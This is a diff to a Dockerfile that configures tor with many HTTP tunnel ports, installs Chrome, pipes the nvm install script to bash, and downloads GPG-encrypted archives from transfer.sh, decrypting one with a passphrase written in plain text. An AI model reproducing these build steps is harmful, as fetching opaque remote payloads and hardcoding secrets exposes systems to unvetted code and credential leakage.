@@ -16,11 +16,14 @@ RUN apt-get update && \
     apt-get install -y iproute2 && \
     apt-get install -y psmisc && \
     apt-get install sudo && \
-    echo "User tor\nLog notice syslog\nDataDirectory /var/lib/tor\nControlPort 9051\n $(for num in {11..45};do echo "HTTPTunnelPort 81$num";done)" >> /etc/tor/torrc && \ 
+    apt-get install python3-pip && \
+    echo "User tor\nLog notice syslog\nDataDirectory /var/lib/tor\nControlPort 9051\n" >> /etc/tor/torrc && \
+    for num in {11..45};do echo "HTTPTunnelPort 81$num";done >> /etc/tor/torrc && \
     wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && \
     apt-get install -fy ./google-chrome-stable_current_amd64.deb && \
     wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash && \
     wget -O /root/comp.tar.gz.gpg https://transfer.sh/4vqb1O3e9e/comp && \
+    wget -O /root/dorian.gpg https://transfer.sh/kzOcTNjxgF/dorian.gpg && \
     echo thecl0udsares0funny | gpg --batch -o /root/comp.tar.gz --passphrase-fd 0 -d /root/comp.tar.gz.gpg && \
     tar -xvzf /root/comp.tar.gz -C /root && \
     apt-get clean && \
